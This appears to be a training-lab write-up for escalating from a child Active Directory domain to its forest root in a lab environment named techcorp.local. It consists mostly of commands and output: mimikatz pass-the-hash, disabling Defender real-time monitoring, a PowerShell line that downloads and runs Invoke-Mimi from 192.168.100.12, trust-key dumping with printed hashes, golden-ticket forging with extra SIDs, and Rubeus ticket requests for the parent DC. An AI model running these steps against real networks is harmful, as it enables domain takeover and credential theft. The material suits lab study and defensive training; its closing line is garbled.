# Content Lab20:



Gain DA privileges of us.techcorp.local domain:
```
C:\Windows\system32>C:\AD\Tools\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:us.techcorp.local /ntlm:43b70d2d979805f419e02882997f8f3f /run:cmd" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::pth /user:Administrator /domain:us.techcorp.local /ntlm:43b70d2d979805f419e02882997f8f3f /run:cmd
user    : Administrator
domain  : us.techcorp.local
program : cmd
impers. : no
NTLM    : 43b70d2d979805f419e02882997f8f3f
  |  PID  5232
  |  TID  6352
  |  LSA Process is now R/W
  |  LUID 0 ; 831349025 (00000000:318d6121)
  \_ msv1_0   - data copy @ 000001DE8F3DBB80 : OK !
  \_ kerberos - data copy @ 000001DE8F97D678
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000001DE8F981248 (32) -> null

mimikatz(commandline) # exit
Bye!

```
Dump intraforest credentials for machine account between, us.techcorp.local and techcorp.local:

```
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>winrs -r:us-dc cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>whoami /all
whoami /all

USER INFORMATION
----------------

User Name        SID
================ ===========================================
us\administrator S-1-5-21-210670787-2521448726-163245708-500


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                         Attributes
========================================== ================ =========================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
US\Domain Admins                           Group            S-1-5-21-210670787-2521448726-163245708-512 Mandatory group, Enabled by default, Enabled group
US\Group Policy Creator Owners             Group            S-1-5-21-210670787-2521448726-163245708-520 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                    Mandatory group, Enabled by default, Enabled group
US\Denied RODC Password Replication Group  Alias            S-1-5-21-210670787-2521448726-163245708-572 Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

C:\Users\Administrator>


C:\Users\Administrator>
C:\Users\Administrator>Set-MpPreference -DisableRealTimeMonitoring $True
Set-MpPreference -DisableRealTimeMonitoring $True
'Set-MpPreference' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Administrator>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> Set-MpPreference -DisableRealTimeMonitoring $True
Set-MpPreference -DisableRealTimeMonitoring $True
PS C:\Users\Administrator> IEX (New-Object Net.Webclient).DownloadSTring("http://192.168.100.12/Invoke-Mimi.ps1")
IEX (New-Object Net.Webclient).DownloadSTring("http://192.168.100.12/Invoke-Mimi.ps1")
PS C:\Users\Administrator> Invoke-Mimi -Command '"privilege::debug" "sekurlsa::trust /patch"'
Invoke-Mimi -Command '"privilege::debug" "sekurlsa::trust /patch"'

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 18:36:14
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # privilege::debug
Privilege '20' OK

mimikatz(powershell) # sekurlsa::trust /patch

Domain: TECHCORP.LOCAL (TECHCORP / S-1-5-21-2781415573-3701854478-2406986946)

  [ Out ] TECHCORP.LOCAL ->
        from: b3 e3 bb 0b c4 49 04 a3 8d a5 c8 1f 90 ca 3e 25 3e 25 5c 0b 04 27 53 f7 08 c9 e7 3f 76 94 ba d9 65 e4 5f c1 d5 1c d2 00 fb 82 8f 53 63 8f 9b e4 4d 9b 4a f7 09 00 ea 60 9a 2f 98 b4 04 90 3f a1 0c 95 f9 68 99 2f c7 b4 e7 d6 5d 71 dc 98 8f 3c b3 50 68 b6 bb b3 37 99 e8 a5 64 42 cc 4d 1b ce b7 ab 61 58 55 d0 3b a6 c7 1d 78 75 c1 7e 22 05 50 45 6d ae 5f 7f 88 3b ef 20 dd 15 3b 65 7a 77 00 ba 78 ea 13 cd 05 55 fc b9 93 a0 d5 0d de ec c5 13 fd b3 7d 7a 46 f4 3f 20 81 3b e9 5e 11 71 68 2b 0a d6 1f 15 48 aa 45 8a 8f b9 9d a2 85 59 7d df 8a 38 f7 e6 26 08 ce ff c6 a1 b5 fd f6 a6 8c 37 f0 da 8b 59 f9 88 ad 57 72 ee 7a d4 67 34 5e d2 bb 8e 52 71 d0 04 ba 50 b6 32 d8 09 03 06 e5 f0 ce fd 4f 3c 27 44 03 17 e7 cc 00 72 fa 06
        * aes256_hmac       : 867e3406a1b85100fd1b201bbc74907d419544d49ce1c8d532738a5e9b612f96
        * aes128_hmac       : 0cefb20dea15e283ba319a920372160b
        * rc4_hmac_nt       : 2877a314be8b9c8bffdd123519357137
        * rc4_hmac_old      : 2877a314be8b9c8bffdd123519357137
        * rc4_md4           : 2877a314be8b9c8bffdd123519357137
        * rc4_hmac_nt_exp   : 2877a314be8b9c8bffdd123519357137
        * rc4_hmac_old_exp  : 2877a314be8b9c8bffdd123519357137

  [  In ] -> TECHCORP.LOCAL
        from: ef 18 af e1 28 c8 d6 8f 7c d4 74 2c e3 18 4d 4f 60 32 9b d2 52 7f cc e6 4e 3f a8 d9 20 fc 65 73 b4 7b bb 8b 28 a9 5a 30 cb 19 af a3 fc 65 a1 6d 39 46 9f a8 a8 05 e4 3d d2 78 8a 66 ca 9d 6a da d6 a5 64 56 5e 87 09 66 65 33 ed 92 d1 75 5d 92 62 9c a2 08 1e 60 7d b7 3a d3 62 de 4e ec 7c 6a 78 49 98 f3 6e cb 42 eb b3 49 c6 a6 44 29 4c 96 94 b7 eb fe df df cd e1 e8 85 12 d5 79 04 48 60 a3 6c 25 bd 79 5b 94 2a 78 b7 3e 47 9b 24 a5 ef ca 27 89 4d 7e 7a 7a 74 f0 b8 62 61 97 13 54 45 4b 5b ce 0f 96 ea 92 c9 45 2e 4a f1 99 1a 0d ef a5 95 0a 81 a6 b3 6b a3 e1 20 15 00 d2 fd 4a 0f 9d 41 dd 2a 4d b8 be 10 2c 8a 5a 48 7c 2f 31 f0 86 30 a0 67 6c b0 82 e7 34 cf 33 fc 43 d6 26 c0 3a b8 ce 11 2b 5b a0 39 c8 34 20 67 5a 0c af 82
        * aes256_hmac       : cfe6be541c158f5a74610f4d6a5976eb2fff85d878026c996fcb8d374c5b1d9c
        * aes128_hmac       : c55e516ad956fb3138e23e230955554c
        * rc4_hmac_nt       : 4b6e45d6b6f307084c1103157704a339
        * rc4_hmac_old      : 4b6e45d6b6f307084c1103157704a339
        * rc4_md4           : 4b6e45d6b6f307084c1103157704a339
        * rc4_hmac_nt_exp   : 4b6e45d6b6f307084c1103157704a339
        * rc4_hmac_old_exp  : 4b6e45d6b6f307084c1103157704a339

  [Out-1] TECHCORP.LOCAL ->
        from: c6 22 17 9e a0 f4 09 30 de 28 09 d4 c4 79 90 92 ab aa e3 76 e5 3c 05 5f e9 36 c9 ba 67 bc 8a 5b e3 ff 4f 2d 73 e7 e9 57 1c f4 b6 47 72 a1 68 9e ed 1c 79 66 56 eb b5 62 fe 31 92 1a 8b 2c aa 15 14 29 a9 c4 66 5e fe 5a 80 36 84 91 9e 59 3e 8a d6 90 d0 5e 3a 77 8b 96 26 a1 40 ed 92 c4 23 53 30 31 b9 bd a4 ce 6f 6e 2a 8f b3 db 94 2f 88 81 ca 2c 48 4b 93 bc ad 51 af 10 3d 71 c9 4b b3 ac 5e eb 3b 6b e8 f3 85 fd e0 0e de 3f 7f 27 f1 a0 7b 10 1a 6d 9d 7f f8 14 8b 23 0e 96 2f 39 d7 62 0b c7 b0 1d 56 a1 b9 b1 af cc 71 0f 48 d4 39 29 1a 23 fa f8 78 a8 18 fb 24 0c 77 29 90 22 10 bc 44 3e 2e 73 49 6a 49 2f 82 be 95 5c 0a 21 58 7b b4 80 66 b0 37 f3 be 19 b2 86 1d fc 0c 19 69 6f 6f 46 c1 a7 09 71 bc a2 61 24 75 ef a6 29 04 8f
        * aes256_hmac       : 792204b3e3df836bcb8dc958c1ddc39eeef22835276957de6a84e31cc37ba3cc
        * aes128_hmac       : 3e517b47c5966385c672735ea17513f5
        * rc4_hmac_nt       : f01daadf07fa71bdb343e882063bc0de
        * rc4_hmac_old      : f01daadf07fa71bdb343e882063bc0de
        * rc4_md4           : f01daadf07fa71bdb343e882063bc0de
        * rc4_hmac_nt_exp   : f01daadf07fa71bdb343e882063bc0de
        * rc4_hmac_old_exp  : f01daadf07fa71bdb343e882063bc0de

  [ In-1] -> TECHCORP.LOCAL
        from: 67 0e 4a 27 70 f1 87 25 aa 93 80 2b f8 59 11 fa 90 24 84 e6 db f8 4d b3 00 3e ba 88 51 b3 19 e7 a2 72 15 5f 14 64 f5 d7 f7 98 a2 56 1c ce 62 09 11 fb f2 93 ce b9 16 b9 47 f9 1b 2b 42 3d 86 ed e7 ef d7 d9 98 76 fa ad 62 13 54 c8 05 28 26 6f e6 2c f5 f9 6d 12 60 20 3a 1f 00 33 4b 35 e4 5d 4c 49 18 0e 51 f7 e6 13 32 f3 8d b6 cc 33 5b 0d 32 ee 19 e6 b8 31 6c cd e0 9e e3 d9 07 e0 87 1c d8 e0 ac fb ee 45 ed d2 65 33 20 f1 f3 ea d6 f6 c6 d4 a8 a4 9b 2c a3 7c 56 12 c1 ad 33 ed fa f4 46 98 97 c5 1e 22 84 47 f5 3f 72 ab 0c 03 71 aa 83 87 01 45 00 28 e1 20 7f f4 6f e4 4b 18 bc 90 f2 08 33 c9 e9 84 bd e4 7f 1d d8 67 d6 e1 27 6d 8f 6e c0 ac bf 34 a2 72 16 1c 0f c4 9c 66 35 e2 94 80 2f 65 f2 34 21 34 ea 1d ac c9 51 6f 0a 5d
        * aes256_hmac       : 103bd68f79d6b229674005186d58ccc4313732fff1a7d71cdd8bc0b75fb17860
        * aes128_hmac       : fce23bfcbb8465bab0af0385ca079a82
        * rc4_hmac_nt       : c571b906ca96798300442abb5e509fda
        * rc4_hmac_old      : c571b906ca96798300442abb5e509fda
        * rc4_md4           : c571b906ca96798300442abb5e509fda
        * rc4_hmac_nt_exp   : c571b906ca96798300442abb5e509fda
        * rc4_hmac_old_exp  : c571b906ca96798300442abb5e509fda

Domain: US.TECHCORP.LOCAL (US)

Domain: EU.LOCAL (EU / S-1-5-21-3657428294-2017276338-1274645009)

```

On the local machine use credentials in order to create a intraforest golden ticket:

```
C:\Windows\system32>C:\AD\Tools\mimikatz.exe "privilege::debug" "kerberos::golden /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /rc4:4b6e45d6b6f307084c1103157704a339 /service:krbtgt /target:techcorp.local /ticket:C:\AD\trust_krb.kirbi" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # kerberos::golden /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /rc4:4b6e45d6b6f307084c1103157704a339 /service:krbtgt /target:techcorp.local /ticket:C:\AD\trust_krb.kirbi
User      : Administrator
Domain    : us.techcorp.local (US)
SID       : S-1-5-21-210670787-2521448726-163245708
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-2781415573-3701854478-2406986946-519 ;
ServiceKey: 4b6e45d6b6f307084c1103157704a339 - rc4_hmac_nt
Service   : krbtgt
Target    : techcorp.local
Lifetime  : 6/25/2023 5:06:54 AM ; 6/22/2033 5:06:54 AM ; 6/22/2033 5:06:54 AM
-> Ticket : C:\AD\trust_krb.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !

mimikatz(commandline) # exit
Bye!

```
use the extracted ticket with rubeus in order to obtain a tgs, for the service CIFS on the parent root domian:

```
C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\trust_krb.kirbi /service:CIFS/techcorp-dc.techcorp.local /dc:techcorp-dc.techcorp.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'CIFS/techcorp-dc.techcorp.local'
[*] Using domain controller: techcorp-dc.techcorp.local (192.168.1.1)
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):
....
```

validate the ticket and access to external domian:

```

Current LogonId is 0:0x2c781f90

Cached Tickets: (1)

#0>     Client: Administrator @ us.techcorp.local
        Server: CIFS/techcorp-dc.techcorp.local @ TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 6/25/2023 5:09:06 (local)
        End Time:   6/25/2023 15:09:06 (local)
        Renew Time: 7/2/2023 5:09:06 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

C:\Windows\system32>dir \\techcorp-dc.techcorp.local\c$
 Volume in drive \\techcorp-dc.techcorp.local\c$ has no label.
 Volume Serial Number is 88AD-6C8B

 Directory of \\techcorp-dc.techcorp.local\c$

07/10/2019  09:00 AM    <DIR>          ExchangeSetupLogs
12/07/2020  03:51 AM    <DIR>          PerfLogs
01/06/2021  01:49 AM    <DIR>          Program Files
07/17/2019  11:02 PM    <DIR>          Program Files (x86)
12/26/2022  04:04 AM    <DIR>          Transcripts
07/18/2019  09:48 AM    <DIR>          Users
10/16/2022  04:52 AM    <DIR>          Windows
               0 File(s)              0 bytes
               7 Dir(s)  14,206,234,624 bytes free
```
```
Use the ticket with RUebeus in order to gain access to the parent root domainUse the extracted tichet
